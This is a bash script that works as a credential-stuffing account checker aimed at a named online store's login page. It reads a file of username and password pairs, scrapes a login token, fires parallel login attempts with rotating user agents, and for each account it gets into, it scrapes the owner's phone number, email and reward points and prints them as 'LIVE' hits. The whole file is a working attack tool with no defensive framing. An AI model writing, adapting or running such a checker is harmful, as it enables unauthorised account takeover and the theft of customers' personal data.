#!/bin/bash

green="\033[0;32m"
reset="\033[0m"


function cleanup {
    rm y_* cok.log 2> /dev/null
}
trap cleanup SIGINT


function agent {
    agent=$(shuf -n 1 "agent_.i")
}


function check_accounts {
    
    dnck=$(echo $x | cut -d "|" -f 1)
    dnck2=$(echo $x | cut -d "|" -f 2)
    none="y_log_$RANDOM"
    req=$(curl -X GET -s "https://www.phd.co.id/en/users/login/1" \
            -H "Host: www.phd.co.id" -A "$agent" --compressed -k --max-time 5 --cookie-jar "$none" | uniq)
    grb=$(echo -e "$req" | grep -Po "name=\"my_token\" value=\"(.*?)\"" | grep -Po '(?<=value=)[a-z,0-9,\"]+' | tr -d '"')
    req_ses=$(curl -X POST "https://www.phd.co.id/en/users/login/1" \
            -H "Host: www.phd.co.id" -A "$agent" --compressed --silent \
            --data-urlencode "return_url=https://www.phd.co.id/en/users/welcome" \
            --data-urlencode "my_token=$grb" \
            --data-urlencode "username=$dnck" \
            --data-urlencode "password=$dnck2" \
            --data-urlencode "remember=1" -k --max-time 5 -s -b "$none" --cookie-jar "cok.log" | uniq)

    # login attempt was successful
    if [[ $req_ses =~ "logged in successfully" ]]; then
        # account details
        accounts=$(curl -X GET 'https://www.phd.co.id/en/accounts' \
                -H "Host: www.phd.co.id" -A "$agent" --compressed --max-time 5 -s -b "cok.log")

        # phone number, email, points
        nomers=$(echo -e "$accounts" | grep -Po 'telephone">(.*?)</li>' | sed -e 's/.*[^0-9]\([0-9]\+\)[^0-9]*/\1/')
        emailsz=$(echo -e "$accounts" | grep -Po '([-a-zA-Z0-9]+@\w+\.\w+)')
        points=$(echo -e "$accounts" | grep -Eo "Poin: [[:digit:]]*" | cut -d ":" -f 2)
        home=$(echo -e "$accounts" | grep -Po 'home":"(.*?)"' | cut -d ":" -f 2)

        # Check if the account is active
        if [[ $home =~ "1" ]]; then
            printf "${green}[LIVE]: Points: %s, Email: %s, Username: %s, Phone Number: %s\n${reset}" "$points" "$emailsz" "$dnck2" "$nomers"
        else
            printf "${RD}[DIE]: Username: %s, Password: %s\n${reset}" "$dnck" "$dnck2"
        fi
    fi
}


read -p "file: " lst

# Check if the input file exists
if [ ! -f "$lst" ]; then
    printf "${RD}[ERROR]: File not found...\n${reset}"
    exit 0
fi

# Start checking accounts in parallel
(
    for x in $(more "$lst"); do
        check_accounts &
    done
)
wait
